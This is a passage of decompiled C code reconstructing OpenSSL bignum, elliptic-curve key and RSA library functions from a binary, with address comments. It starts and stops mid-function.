  lab_0x447d6f:;
    int64_t * v7 = (int64_t *)((int64_t)(8 * v4) + a1); // 0x447d87
    *v7 = *v7 | 1 << a2 % 64;
    // 0x447d8f
    return 1;
  lab_0x447d4a:;
    int64_t v8 = v5;
    int64_t v9 = 0x100000000 * v8 / 0x20000000 + a1; // 0x447d55
    int64_t v10 = v8 + 1 & 0xffffffff; // 0x447d58
    *(int64_t *)v9 = 0;
    int64_t v11 = v10; // 0x447d68
    v9 += 8;
    while (v10 <= (int64_t)v4) {
        // 0x447d58
        v10 = v11 + 1 & 0xffffffff;
        *(int64_t *)v9 = 0;
        v11 = v10;
        v9 += 8;
    }
    // 0x447d6a
    *v2 = v6;
    goto lab_0x447d6f;
}

// Address range: 0x447de0 - 0x447e4e
int64_t BN_set_word(int64_t a1, int64_t a2) {
    // 0x447de0
    if (*(int32_t *)(a1 + 12) >= 1) {
        // 0x447dfb
        *(int32_t *)(a1 + 16) = 0;
        *(int64_t *)a1 = a2;
        *(int32_t *)(a1 + 8) = (int32_t)(a2 != 0);
        return 1;
    }
    int64_t result = bn_expand2(a1, 1); // 0x447e35
    if (result == 0) {
        // 0x447e3f
        return result;
    }
    // 0x447dfb
    *(int32_t *)(a1 + 16) = 0;
    *(int64_t *)a1 = a2;
    *(int32_t *)(a1 + 8) = (int32_t)(a2 != 0);
    return 1;
}

// Address range: 0x447e50 - 0x447f4c
int64_t BN_copy(int64_t result, int64_t a2) {
    // 0x447e50
    if (result == a2) {
        // 0x447e5f
        return result;
    }
    int32_t * v1 = (int32_t *)(a2 + 8); // 0x447e70
    uint32_t v2 = *v1; // 0x447e70
    int64_t v3 = v2; // 0x447e70
    int64_t v4 = v3; // 0x447e76
    if (v2 > *(int32_t *)(result + 12)) {
        // 0x447f30
        if (bn_expand2(result, v3) == 0) {
            // 0x447e5f
            return 0;
        }
        // 0x447f44
        v4 = (int64_t)*v1;
    }
    int32_t v5 = v4; // 0x447e7c
    int64_t v6 = v4; // 0x447e8d
    int64_t v7 = result; // 0x447e8d
    if (v5 >= 0 && v5 >= 4) {
        int64_t v8 = 32 * (int64_t)(v5 / 4) + 0x1fffffffe0 & 0x1fffffffe0; // 0x447e96
        int64_t v9 = 0;
        int64_t v10 = v9 + v4;
        int64_t v11 = v9 + result;
        *(int64_t *)(v11 + 8) = *(int64_t *)(v10 + 8);
        *(int64_t *)(v11 + 16) = *(int64_t *)(v10 + 16);
        *(int64_t *)v11 = *(int64_t *)v10;
        *(int64_t *)(v11 + 24) = *(int64_t *)(v10 + 24);
        int64_t v12 = v9 + 32; // 0x447ecd
        while (v9 != v8) {
            // 0x447ea0
            v9 = v12;
            v10 = v9 + v4;
            v11 = v9 + result;
            *(int64_t *)(v11 + 8) = *(int64_t *)(v10 + 8);
            *(int64_t *)(v11 + 16) = *(int64_t *)(v10 + 16);
            *(int64_t *)v11 = *(int64_t *)v10;
            *(int64_t *)(v11 + 24) = *(int64_t *)(v10 + 24);
            v12 = v9 + 32;
        }
        int64_t v13 = v8 + 32; // 0x447ed8
        v6 = v13 + v4;
        v7 = v13 + result;
    }
    uint64_t v14 = v4 % 4; // 0x447ee4
    if (v14 == 2) {
        // 0x447f18
        *(int64_t *)(v7 + 8) = *(int64_t *)(v6 + 8);
        goto lab_0x447f20;
    } else {
        switch ((int32_t)v14) {
            case 3: {
                // 0x447f10
                *(int64_t *)(v7 + 16) = *(int64_t *)(v6 + 16);
                // 0x447f18
                *(int64_t *)(v7 + 8) = *(int64_t *)(v6 + 8);
                goto lab_0x447f20;
            }
            case 1: {
                goto lab_0x447f20;
            }
            default: {
                goto lab_0x447ef6;
            }
        }
    }
  lab_0x447f20:
    // 0x447f20
    *(int64_t *)v7 = *(int64_t *)v6;
  lab_0x447ef6:
    // 0x447ef6
    *(int32_t *)(result + 8) = v5;
    *(int32_t *)(result + 16) = *(int32_t *)(a2 + 16);
    return result;
}

// Address range: 0x447f50 - 0x447fc4
int64_t BN_new(int64_t a1, int64_t a2, char a3) {
    // 0x447f50
    int64_t v1; // 0x447f50
    int64_t v2; // 0x447f50
    int64_t result = CRYPTO_malloc(24, "bn_lib.c", 283, v2, v1); // 0x447f65
    if (result == 0) {
        // 0x447f97
        ERR_put_error(3, 113, 65, "bn_lib.c", 285);
    } else {
        // 0x447f6f
        *(int32_t *)(result + 20) = 1;
        *(int32_t *)(result + 8) = 0;
        *(int32_t *)(result + 16) = 0;
        *(int32_t *)(result + 12) = 0;
        *(int64_t *)result = 0;
    }
    // 0x447f92
    return result;
}

// Address range: 0x447fd0 - 0x448115
int64_t BN_bin2bn(int64_t a1, int32_t a2, int32_t a3) {
    int64_t v1 = a2;
    int64_t v2 = v1; // 0x447fe3
    int64_t result = 0; // 0x447fe3
    if (a3 == 0) {
        // 0x4480f0
        result = BN_new(a1, v1, 0);
        if (result == 0) {
            // 0x448094
            return 0;
        }
        // 0x44810d
        v2 = v1 & 0xffffffff;
    }
    // 0x447fe9
    if ((int32_t)v2 == 0) {
        // 0x4480a8
        *(int32_t *)(result + 8) = 0;
        return result;
    }
    uint64_t v3 = v2 + 0xffffffff; // 0x447ff1
    uint32_t v4 = (int32_t)v3 / 8; // 0x447ff8
    uint32_t v5 = v4 + 1; // 0x447ffb
    int64_t v6 = v5; // 0x447ffb
    int64_t result2 = result; // 0x448001
    if (v4 >= *(int32_t *)(result + 12)) {
        int64_t v7 = bn_expand2(result, v6); // 0x4480c9
        result2 = 0x100000000 * result / 0x100000000;
        if (v7 == 0) {
            // 0x4480db
            if (result != 0) {
                // 0x4480e2
                BN_free(result);
            }
            // 0x448094
            return 0;
        }
    }
    int64_t v8 = a1 + 1; // 0x448007
    int32_t * v9 = (int32_t *)(result2 + 8); // 0x448014
    *v9 = v5;
    *(int32_t *)(result2 + 16) = 0;
    int64_t v10 = (v3 & 0xffffffff) + v8; // 0x44801e
    int64_t * v11 = (int64_t *)result2;
    int64_t v12 = 0; // 0x448024
    int64_t v13 = v8; // 0x448024
    int64_t v14 = a1; // 0x448024
    int64_t v15 = v6; // 0x448024
    int64_t v16 = v3 % 8; // 0x448024
    while (true) {
        int64_t v17 = v16;
        int64_t v18 = v15;
        int64_t v19 = v14;
        v14 = v13;
        int64_t v20 = 256 * v12 | (int64_t)*(char *)v19; // 0x448043
        if ((int32_t)v17 != 0) {
            // 0x448030
            v12 = v20;
            v15 = v18;
            v16 = v17 + 0xffffffff & 0xffffffff;
            if (v14 == v10) {
                // break -> 0x448065
                break;
            }
        } else {
            int64_t v21 = v18 + 0xffffffff; // 0x448050
            *(int64_t *)(*v11 + (8 * v21 & 0x7fffffff8)) = v20;
            v12 = 0;
            v15 = v21 & 0xffffffff;
            v16 = 7;
            if (v14 == v10) {
                // break -> 0x448065
                break;
            }
        }
        // 0x448038
        v13 = v14 + 1;
    }
    uint32_t v22 = *v9; // 0x448065
    if (v22 < 1) {
        // 0x448094
        return result2;
    }
    int64_t v23 = v22; // 0x448065
    int64_t v24 = v23; // 0x44807a
    int64_t v25 = 0x100000000 * v23 / 0x20000000 - 8 + *v11; // 0x44807a
    while (*(int64_t *)v25 == 0) {
        uint32_t v26 = (int32_t)v24 - 1; // 0x44808c
        v24 = v26;
        v25 -= 8;
        if (v26 == 0) {
            // break -> 0x448091
            break;
        }
    }
    // 0x448091
    *v9 = (int32_t)v24;
    // 0x448094
    return result2;
}

// Address range: 0x448120 - 0x44816b
int64_t BN_dup(int64_t a1) {
    // 0x448120
    if (a1 == 0) {
        // 0x44812c
        return 0;
    }
    // 0x448138
    int64_t v1; // 0x448120
    int64_t v2; // 0x448120
    int64_t v3 = BN_new(a1, v1, (char)v2); // 0x44813d
    if (v3 == 0) {
        // 0x44812c
        return 0;
    }
    int64_t v4 = BN_copy(v3, a1); // 0x448155
    int64_t result = v3; // 0x44815d
    if (v4 == 0) {
        // 0x44815f
        BN_free(v3);
        result = 0;
    }
    // 0x44812c
    return result;
}

// Address range: 0x448200 - 0x44827e
int64_t BN_clear_free(int64_t a1) {
    int64_t result; // 0x448200
    if (a1 == 0) {
        // 0x448246
        return result;
    }
    int64_t v1 = 8 * (int64_t)*(int32_t *)(a1 + 12); // 0x448222
    OPENSSL_cleanse(a1, v1);
    int32_t * v2 = (int32_t *)(a1 + 20); // 0x44822b
    int32_t v3 = *v2; // 0x44822b
    int32_t v4 = v3; // 0x448232
    if ((v3 & 2) == 0) {
        // 0x448258
        CRYPTO_free(a1, v1);
        v4 = *v2;
    }
    // 0x448234
    result = OPENSSL_cleanse(a1, 24);
    if (v4 % 2 != 0) {
        // 0x448268
        return CRYPTO_free(a1, 24);
    }
    // 0x448246
    return result;
}

// Address range: 0x448300 - 0x4483a1
int64_t BN_CTX_new(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    int64_t result = CRYPTO_malloc(64, "bn_ctx.c", 216, a4, a5); // 0x448315
    if (result == 0) {
        // 0x448374
        ERR_put_error(3, 106, 65, "bn_ctx.c", 219);
    } else {
        // 0x44831f
        *(int64_t *)(result + 16) = 0;
        *(int64_t *)(result + 8) = 0;
        *(int64_t *)result = 0;
        *(int32_t *)(result + 28) = 0;
        *(int32_t *)(result + 24) = 0;
        *(int64_t *)(result + 32) = 0;
        *(int32_t *)(result + 44) = 0;
        *(int32_t *)(result + 40) = 0;
        *(int32_t *)(result + 48) = 0;
        *(int32_t *)(result + 52) = 0;
        *(int32_t *)(result + 56) = 0;
    }
    // 0x44836f
    return result;
}

// Address range: 0x4483b0 - 0x448513
int64_t BN_CTX_get(int64_t a1) {
    // 0x4483b0
    if (*(int32_t *)(a1 + 52) != 0) {
        // 0x4483d4
        return 0;
    }
    int32_t * v1 = (int32_t *)(a1 + 56); // 0x4483f0
    if (*v1 != 0) {
        // 0x4483d4
        return 0;
    }
    int32_t * v2 = (int32_t *)(a1 + 24); // 0x4483f7
    uint32_t v3 = *v2; // 0x4483f7
    int32_t * v4 = (int32_t *)(a1 + 28); // 0x4483fa
    int64_t result; // 0x4483b0
    if (v3 == *v4) {
        // 0x448461
        int64_t v5; // 0x4483b0
        int64_t v6; // 0x4483b0
        int64_t v7 = CRYPTO_malloc(400, "bn_ctx.c", 409, v6, v5); // 0x448472
        if (v7 == 0) {
            // 0x4484d7
            *v1 = 1;
            ERR_put_error(3, 116, 109, "bn_ctx.c", 298);
            // 0x4483d4
            return 0;
        }
        int64_t v8 = 0;
        int64_t v9 = v8 + v7; // 0x448488
        BN_init(v9);
        int64_t v10 = v8 + 24; // 0x44849d
        while (v8 != 360) {
            // 0x448488
            v8 = v10;
            v9 = v8 + v7;
            BN_init(v9);
            v10 = v8 + 24;
        }
        int64_t * v11 = (int64_t *)(a1 + 16); // 0x44849f
        int64_t v12 = *v11; // 0x44849f
        *(int64_t *)(v7 + 392) = 0;
        *(int64_t *)(v7 + 384) = v12;
        if (v9 == 0) {
            // 0x448506
            *v11 = v7;
            *(int64_t *)(a1 + 8) = v7;
            *(int64_t *)a1 = v7;
        } else {
            // 0x4484bb
            *(int64_t *)(v12 + 392) = v7;
            *v11 = v7;
            *(int64_t *)(a1 + 8) = v7;
        }
        // 0x4484ca
        *v4 = *v4 + 16;
        *v2 = *v2 + 1;
        result = v7;
    } else {
        int64_t v13; // 0x4483b0
        int64_t v14; // 0x4483b0
        if (v3 == 0) {
            // 0x448440
            *(int64_t *)(a1 + 8) = a1;
            v13 = 0;
            v14 = a1;
        } else {
            uint32_t v15 = v3 % 16;
            int64_t * v16 = (int64_t *)(a1 + 8);
            int64_t v17 = *v16;
            v13 = v15;
            v14 = v17;
            if (v15 == 0) {
                int64_t v18 = *(int64_t *)(v17 + 392); // 0x448454
                *v16 = v18;
                v13 = 0;
                v14 = v18;
            }
        }
        // 0x44840b
        *v2 = v3 + 1;
        result = v14 + 24 * v13;
    }
    // 0x44841f
    if (result == 0) {
        // 0x4484d7
        *v1 = 1;
        ERR_put_error(3, 116, 109, "bn_ctx.c", 298);
        // 0x4483d4
        return 0;
    }
    // 0x448428
    BN_set_word(result, 0);
    int32_t * v19 = (int32_t *)(a1 + 48); // 0x448432
    *v19 = *v19 + 1;
    // 0x4483d4
    return result;
}

// Address range: 0x448640 - 0x4486ca
int64_t BN_CTX_free(int64_t a1) {
    // 0x448640
    if (a1 == 0) {
        // 0x4486c5
        int64_t result; // 0x448640
        return result;
    }
    uint32_t v1 = *(int32_t *)(a1 + 44); // 0x44864c
    int64_t v2 = v1; // 0x448651
    int64_t v3; // 0x448640
    if (v1 != 0) {
        // 0x4486b9
        v2 = *(int64_t *)(a1 + 32);
        CRYPTO_free(v2, v3);
    }
    // 0x448653
    if (v2 == 0) {
        // 0x4486ad
        return CRYPTO_free(a1, v3);
    }
    int64_t * v4 = (int64_t *)(a1 + 8);
    int64_t v5 = 1;
    int64_t v6 = v2; // 0x44867b
    if (*(int64_t *)v6 != 0) {
        // 0x44867d
        BN_clear_free(v6);
    }
    int64_t v7 = v6;
    int64_t v8; // 0x448640
    while (v5 != 16) {
        // 0x448670
        v5 = v5 + 1 & 0xffffffff;
        v6 += 24;
        v8 = v7;
        if (*(int64_t *)v6 != 0) {
            // 0x44867d
            BN_clear_free(v6);
            v8 = v6;
        }
        // 0x448685
        v7 = v8;
    }
    // 0x44868a
    *v4 = *(int64_t *)(v7 + 392);
    CRYPTO_free(v7, v3);
    int64_t v9 = *v4; // 0x44869f
    *(int64_t *)a1 = v9;
    while (v9 != 0) {
        // 0x448660
        v5 = 1;
        v6 = v9;
        v8 = v7;
        if (*(int64_t *)v6 != 0) {
            // 0x44867d
            BN_clear_free(v6);
            v8 = v6;
        }
        // 0x448685
        v7 = v8;
        while (v5 != 16) {
            // 0x448670
            v5 = v5 + 1 & 0xffffffff;
            v6 += 24;
            v8 = v7;
            if (*(int64_t *)v6 != 0) {
                // 0x44867d
                BN_clear_free(v6);
                v8 = v6;
            }
            // 0x448685
            v7 = v8;
        }
        // 0x44868a
        *v4 = *(int64_t *)(v7 + 392);
        CRYPTO_free(v7, v3);
        v9 = *v4;
        *(int64_t *)a1 = v9;
    }
    // 0x4486ad
    return CRYPTO_free(a1, v3);
}

// Address range: 0x44ba20 - 0x44ba72
int64_t BN_BLINDING_free(int64_t a1) {
    // 0x44ba20
    if (a1 == 0) {
        // 0x44ba70
        int64_t result; // 0x44ba20
        return result;
    }
    // 0x44ba31
    BN_free(a1);
    int64_t v1 = *(int64_t *)(a1 + 8); // 0x44ba36
    if (v1 != 0) {
        // 0x44ba3f
        BN_free(v1);
    }
    int64_t v2 = *(int64_t *)(a1 + 16); // 0x44ba44
    if (v2 != 0) {
        // 0x44ba4d
        BN_free(v2);
    }
    int64_t v3 = *(int64_t *)(a1 + 24); // 0x44ba52
    if (v3 != 0) {
        // 0x44ba5b
        BN_free(v3);
    }
    // 0x44ba60
    int64_t v4; // 0x44ba20
    return CRYPTO_free(a1, v4);
}

// Address range: 0x44f970 - 0x44f975
int64_t EC_KEY_get0_public_key(int64_t a1) {
    // 0x44f970
    return *(int64_t *)(a1 + 16);
}

// Address range: 0x44f9b0 - 0x44f9b4
int64_t EC_KEY_get_flags(int64_t a1) {
    // 0x44f9b0
    return (int64_t)*(int32_t *)(a1 + 44);
}

// Address range: 0x44f9c0 - 0x44f9c4
int64_t EC_KEY_set_flags(int64_t a1, int64_t a2) {
    int32_t * v1 = (int32_t *)(a1 + 44); // 0x44f9c0
    *v1 = *v1 | (int32_t)a2;
    int64_t result; // 0x44f9c0
    return result;
}

// Address range: 0x44fa20 - 0x44faab
int64_t EC_KEY_get_key_method_data(int64_t a1, int64_t a2, int64_t a3, int64_t a4) {
    // 0x44fa20
    int64_t v1; // 0x44fa20
    int64_t v2; // 0x44fa20
    CRYPTO_lock(5, 33, "ec_key.c", 569, v2, v1);
    int64_t result = EC_EX_DATA_get_data(*(int64_t *)(a1 + 48), a2, a3, a4); // 0x44fa6c
    CRYPTO_lock(6, 33, "ec_key.c", 571, (int64_t)&g299, (int64_t)&g299);
    return result;
}

// Address range: 0x44fab0 - 0x44fb78
int64_t EC_KEY_insert_key_method_data(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5) {
    // 0x44fab0
    int64_t v1; // 0x44fab0
    int64_t v2; // 0x44fab0
    CRYPTO_lock(9, 33, "ec_key.c", 581, v2, v1);
    int64_t v3 = a1 + 48; // 0x44fafc
    int64_t result = EC_EX_DATA_get_data(*(int64_t *)v3, a3, a4, a5); // 0x44fb0a
    if (result == 0) {
        // 0x44fb60
        EC_EX_DATA_set_data(v3, a2, a3, a4, a5);
    }
    // 0x44fb17
    CRYPTO_lock(10, 33, "ec_key.c", 585, (int64_t)&g299, (int64_t)&g299);
    return result;
}

// Address range: 0x44fba0 - 0x44fbea
int64_t EC_KEY_set_public_key(int64_t a1, int64_t a2) {
    int64_t * v1 = (int64_t *)(a1 + 16); // 0x44fbb1
    int64_t v2 = *v1; // 0x44fbb1
    if (v2 != 0) {
        // 0x44fbbd
        EC_POINT_free(v2);
    }
    int64_t v3 = EC_POINT_dup(a2, *(int64_t *)(a1 + 8)); // 0x44fbc9
    *v1 = v3;
    return v3 != 0;
}

// Address range: 0x44fbf0 - 0x44fc36
int64_t EC_KEY_set_private_key(int64_t a1, int64_t a2) {
    int64_t * v1 = (int64_t *)(a1 + 24); // 0x44fc01
    int64_t v2 = *v1; // 0x44fc01
    if (v2 != 0) {
        // 0x44fc0d
        BN_clear_free(v2);
    }
    int64_t v3 = BN_dup(a2); // 0x44fc15
    *v1 = v3;
    return v3 != 0;
}

// Address range: 0x44fc90 - 0x44ff19
int64_t EC_KEY_check_key(int64_t a1) {
    // 0x44fc90
    if (a1 == 0) {
        // 0x44fdb0
        ERR_put_error(16, 177, 67, "ec_key.c", 355);
        // 0x44fcfb
        return 0;
    }
    int64_t * v1 = (int64_t *)(a1 + 8); // 0x44fcb4
    int64_t v2 = *v1; // 0x44fcb4
    if (v2 == 0) {
        // 0x44fdb0
        ERR_put_error(16, 177, 67, "ec_key.c", 355);
        // 0x44fcfb
        return 0;
    }
    int64_t * v3 = (int64_t *)(a1 + 16); // 0x44fcc1
    int64_t v4 = *v3; // 0x44fcc1
    if (v4 == 0) {
        // 0x44fdb0
        ERR_put_error(16, 177, 67, "ec_key.c", 355);
        // 0x44fcfb
        return 0;
    }
    // 0x44fcce
    if ((int32_t)EC_POINT_is_at_infinity(v2, v4) != 0) {
        // 0x44fcd7
        ERR_put_error(16, 177, 106, "ec_key.c", 361);
        // 0x44fcfb
        return 0;
    }
    // 0x44fd20
    int64_t v5; // 0x44fc90
    int64_t v6; // 0x44fc90
    int64_t v7; // 0x44fc90
    int64_t v8; // 0x44fc90
    int64_t v9 = BN_CTX_new(v2, v4, v7, v8, v6, v5); // 0x44fd20
    if (v9 == 0) {
        // 0x44fcfb
        return 0;
    }
    int64_t v10 = EC_POINT_new(*v1); // 0x44fd34
    if (v10 == 0) {
        // 0x44fd88
        BN_CTX_free(v9);
        // 0x44fcfb
        return 0;
    }
    // 0x44fd41
    int64_t v11; // 0x44fc90
    int64_t v12; // 0x44fc90
    int64_t v13; // 0x44fc90
    if ((int32_t)EC_POINT_is_on_curve(*v1, *v3) == 0) {
        // 0x44fea8
        ERR_put_error(16, 177, 107, "ec_key.c", 373);
        v11 = 0;
        goto lab_0x44fd99;
    } else {
        int64_t v14 = *v1; // 0x44fd59
        if (*(int32_t *)(v14 + 24) != 0) {
            int64_t v15 = v14 + 16; // 0x44fde0
            int64_t v16 = *v3; // 0x44fde4
            v13 = 385;
            if ((int32_t)EC_POINT_mul(v14, v10, 0, v16, v15, v9) == 0) {
                goto lab_0x44fe80;
            } else {
                // 0x44fe02
                v12 = 390;
                if ((int32_t)EC_POINT_is_at_infinity(*v1, v10) == 0) {
                    goto lab_0x44fe37;
                } else {
                    int64_t * v17 = (int64_t *)(a1 + 24); // 0x44fe18
                    int64_t v18 = *v17; // 0x44fe18
                    v11 = 1;
                    if (v18 == 0) {
                        goto lab_0x44fd99;
                    } else {
                        // 0x44fe25
                        v12 = 400;
                        if ((int32_t)BN_cmp(v18, v15, 0, v16, 390, v9) < 0) {
                            // 0x44fe5a
                            v13 = 406;
                            if ((int32_t)EC_POINT_mul(*v1, v10, (int32_t)*v17, 0, 0, v9) != 0) {
                                // 0x44fed9
                                v11 = 1;
                                if ((int32_t)EC_POINT_cmp(*v1, v10, *v3) != 0) {
                                    // 0x44fef0
                                    ERR_put_error(16, 177, 123, "ec_key.c", 412);
                                    v11 = 0;
                                }
                                goto lab_0x44fd99;
                            } else {
                                goto lab_0x44fe80;
                            }
                        } else {
                            goto lab_0x44fe37;
                        }
                    }
                }
            }
        } else {
            // 0x44fd64
            ERR_put_error(16, 177, 122, "ec_key.c", 380);
            v11 = 0;
            goto lab_0x44fd99;
        }
    }
  lab_0x44fd99:
    // 0x44fd99
    BN_CTX_free(v9);
    EC_POINT_free(v10);
    // 0x44fcfb
    return v11 & 0xffffffff;
  lab_0x44fe80:
    // 0x44fe80
    ERR_put_error(16, 177, 16, "ec_key.c", v13);
    v11 = 0;
    goto lab_0x44fd99;
  lab_0x44fe37:
    // 0x44fe37
    ERR_put_error(16, 177, 130, "ec_key.c", v12);
    v11 = 0;
    goto lab_0x44fd99;
}

// Address range: 0x44ff20 - 0x450106
int64_t EC_KEY_set_public_key_affine_coordinates(int64_t a1, int64_t a2, int64_t a3) {
    // 0x44ff20
    if (a1 == 0 || a2 == 0) {
        // 0x44fff8
        ERR_put_error(16, 229, 67, "ec_key.c", 435);
        // 0x45001c
        return 0;
    }
    int64_t * v1 = (int64_t *)(a1 + 8); // 0x44ff5d
    if (a3 == 0 | *v1 == 0) {
        // 0x44fff8
        ERR_put_error(16, 229, 67, "ec_key.c", 435);
        // 0x45001c
        return 0;
    }
    // 0x44ff71
    int64_t v2; // 0x44ff20
    int64_t v3; // 0x44ff20
    int64_t v4; // 0x44ff20
    int64_t v5 = BN_CTX_new(a1, a2, a3, v4, v3, v2); // 0x44ff71
    if (v5 == 0) {
        // 0x45001c
        return 0;
    }
    int64_t v6 = EC_POINT_new(*v1); // 0x44ff89
    if (v6 == 0) {
        // 0x44ffdb
        BN_CTX_free(v5);
        // 0x45001c
        return 0;
    }
    // 0x44ff96
    EC_METHOD_get_field_type(EC_GROUP_method_of(*v1));
    int64_t v7 = BN_CTX_get(v5); // 0x44ffaa
    int64_t v8 = BN_CTX_get(v5); // 0x44ffb5
    int64_t v9 = 0; // 0x44ffd6
    if ((int32_t)EC_POINT_set_affine_coordinates_GFp(*v1, v6) != 0) {
        // 0x450048
        v9 = 0;
        if ((int32_t)EC_POINT_get_affine_coordinates_GFp(*v1, v6) == 0) {
            goto lab_0x44ffe8;
        } else {
            // 0x450067
            if ((int32_t)BN_cmp(a2, v7, v7, v8, v5, v2) != 0) {
                // 0x450087
                ERR_put_error(16, 229, 146, "ec_key.c", 482);
                v9 = 0;
                goto lab_0x44ffe8;
            } else {
                // 0x450076
                if ((int32_t)BN_cmp(a3, v8, v7, v8, v5, v2) == 0) {
                    // 0x4500b0
                    if ((int32_t)BN_cmp(a2, *v1 + 104, v7, v8, v5, v2) >= 0) {
                        // 0x450087
                        ERR_put_error(16, 229, 146, "ec_key.c", 482);
                        v9 = 0;
                        goto lab_0x44ffe8;
                    } else {
                        // 0x4500c4
                        if ((int32_t)BN_cmp(a3, *v1 + 104, v7, v8, v5, v2) >= 0) {
                            // 0x450087
                            ERR_put_error(16, 229, 146, "ec_key.c", 482);
                            v9 = 0;
                            goto lab_0x44ffe8;
                        } else {
                            // 0x4500d8
                            v9 = 0;
                            if ((int32_t)EC_KEY_set_public_key(a1, v6) != 0) {
                                // 0x4500eb
                                v9 = (int32_t)EC_KEY_check_key(a1) != 0;
                            }
                            goto lab_0x44ffe8;
                        }
                    }
                } else {
                    // 0x450087
                    ERR_put_error(16, 229, 146, "ec_key.c", 482);
                    v9 = 0;
                    goto lab_0x44ffe8;
                }
            }
        }
    } else {
        goto lab_0x44ffe8;
    }
  lab_0x44ffe8:
    // 0x44ffe8
    BN_CTX_free(v5);
    EC_POINT_free(v6);
    // 0x45001c
    return v9 & 0xffffffff;
}

// Address range: 0x450660 - 0x4506d9
int64_t EC_KEY_free(int64_t a1) {
    if (a1 == 0) {
        // 0x45068d
        int64_t result; // 0x450660
        return result;
    }
    int64_t result2 = CRYPTO_add_lock(a1 + 40, 0xffffffff, 33, "ec_key.c", 111); // 0x450684
    if ((int32_t)result2 >= 1) {
        // 0x45068d
        return result2;
    }
    int64_t v1 = *(int64_t *)(a1 + 8); // 0x450690
    if (v1 != 0) {
        // 0x450699
        EC_GROUP_free(v1);
    }
    int64_t v2 = *(int64_t *)(a1 + 16); // 0x45069e
    if (v2 != 0) {
        // 0x4506a7
        EC_POINT_free(v2);
    }
    int64_t v3 = *(int64_t *)(a1 + 24); // 0x4506ac
    if (v3 != 0) {
        // 0x4506b5
        BN_clear_free(v3);
    }
    // 0x4506ba
    EC_EX_DATA_free_all_data(a1 + 48);
    OPENSSL_cleanse(a1, 56);
    return CRYPTO_free(a1, 56);
}

// Address range: 0x4506e0 - 0x450773
int64_t EC_KEY_new(void) {
    // 0x4506e0
    int64_t v1; // 0x4506e0
    int64_t v2; // 0x4506e0
    int64_t result = CRYPTO_malloc(56, "ec_key.c", 72, v2, v1); // 0x4506f5
    if (result == 0) {
        // 0x450746
        ERR_put_error(16, 182, 65, "ec_key.c", 75);
    } else {
        // 0x4506ff
        *(int32_t *)result = 1;
        *(int32_t *)(result + 44) = 0;
        *(int64_t *)(result + 8) = 0;
        *(int64_t *)(result + 16) = 0;
        *(int64_t *)(result + 24) = 0;
        *(int32_t *)(result + 32) = 0;
        *(int32_t *)(result + 36) = 4;
        *(int32_t *)(result + 40) = 1;
        *(int64_t *)(result + 48) = 0;
    }
    // 0x450741
    return result;
}

// Address range: 0x4507d0 - 0x45081b
int64_t EC_KEY_new_by_curve_name(uint32_t a1) {
    int64_t v1 = EC_KEY_new(); // 0x4507e0
    if (v1 == 0) {
        // 0x4507fd
        return 0;
    }
    int64_t v2 = EC_GROUP_new_by_curve_name((int64_t)a1); // 0x4507ef
    *(int64_t *)(v1 + 8) = v2;
    int64_t result = v1; // 0x4507fb
    if (v2 == 0) {
        // 0x45080f
        EC_KEY_free(v1);
        result = 0;
    }
    // 0x4507fd
    return result;
}

// Address range: 0x450c60 - 0x450c92
int64_t RSA_up_ref(int64_t a1) {
    int32_t v1 = CRYPTO_add_lock(a1 + 112, 1, 9, "rsa_lib.c", 278); // 0x450c84
    int32_t v2 = v1 - 1; // 0x450c84
    return v2 < 0 == (v1 & -v1) < 0 == (v2 != 0);
}

// Address range: 0x450ca0 - 0x450dad
int64_t RSA_free(int64_t a1) {
    if (a1 == 0) {
        // 0x450ccd
        int64_t result; // 0x450ca0
        return result;
    }
    int64_t result2 = CRYPTO_add_lock(a1 + 112, 0xffffffff, 9, "rsa_lib.c", 240); // 0x450cc4
    if ((int32_t)result2 >= 1) {
        // 0x450ccd
        return result2;
    }
    int64_t v1 = *(int64_t *)(a1 + 24); // 0x450ce2
    if (v1 != 0) {
        // 0x450ceb
        ENGINE_finish(v1);
    }
    // 0x450cf0
    CRYPTO_free_ex_data(6, a1, a1 + 96);
    int64_t v2 = *(int64_t *)(a1 + 32); // 0x450d01
    if (v2 != 0) {
        // 0x450d0a
        BN_clear_free(v2);
    }
    int64_t v3 = *(int64_t *)(a1 + 40); // 0x450d0f
    if (v3 != 0) {
        // 0x450d18
        BN_clear_free(v3);
    }
    int64_t v4 = *(int64_t *)(a1 + 48); // 0x450d1d
    if (v4 != 0) {
        // 0x450d26
        BN_clear_free(v4);
    }
    int64_t v5 = *(int64_t *)(a1 + 56); // 0x450d2b
    if (v5 != 0) {
        // 0x450d34
        BN_clear_free(v5);
    }
    int64_t v6 = *(int64_t *)(a1 + 64); // 0x450d39
    if (v6 != 0) {
        // 0x450d42
        BN_clear_free(v6);
    }
    int64_t v7 = *(int64_t *)(a1 + 72); // 0x450d47
    if (v7 != 0) {
        // 0x450d50
        BN_clear_free(v7);
    }
    int64_t v8 = *(int64_t *)(a1 + 80); // 0x450d55
    if (v8 != 0) {
        // 0x450d5e
        BN_clear_free(v8);
    }
    int64_t v9 = *(int64_t *)(a1 + 88); // 0x450d63
    if (v9 != 0) {
        // 0x450d6c
        BN_clear_free(v9);
    }
    int64_t v10 = *(int64_t *)(a1 + 152); // 0x450d71
    if (v10 != 0) {
        // 0x450d7d
        BN_BLINDING_free(v10);
    }
    int64_t v11 = *(int64_t *)(a1 + 160); // 0x450d82
    if (v11 != 0) {
        // 0x450d8e
        BN_BLINDING_free(v11);
    }
    int64_t v12 = *(int64_t *)(a1 + 144); // 0x450d93
    if (v12 != 0) {
        // 0x450d9f
        CRYPTO_free_locked(v12, a1);
    }
    // 0x450da4
    return CRYPTO_free(a1, a1);
}

// Address range: 0x450ea0 - 0x450ec9
int64_t RSA_get_default_method(void) {
    int64_t result = g268; // 0x450ea4
    if (result != 0) {
        // 0x450eb0
        return result;
    }
    int64_t result2 = RSA_PKCS1_SSLeay(); // 0x450eb8
    g268 = result2;
    return result2;
}

// Address range: 0x450ed0 - 0x45114f
int64_t RSA_new_method(int32_t a1) {
    // 0x450ed0
    int64_t v1; // 0x450ed0
    int64_t v2; // 0x450ed0
    int64_t result = CRYPTO_malloc(168, "rsa_lib.c", 146, v2, v1); // 0x450eea
    if (result == 0) {
        // 0x4510f0
        ERR_put_error(4, 106, 65, "rsa_lib.c", 149);
        // 0x451041
        return 0;
    }
    int64_t v3 = RSA_get_default_method(); // 0x450efb
    int64_t * v4 = (int64_t *)(result + 16); // 0x450f03
    *v4 = v3;
    int64_t v5; // 0x450ed0
    if (a1 == 0) {
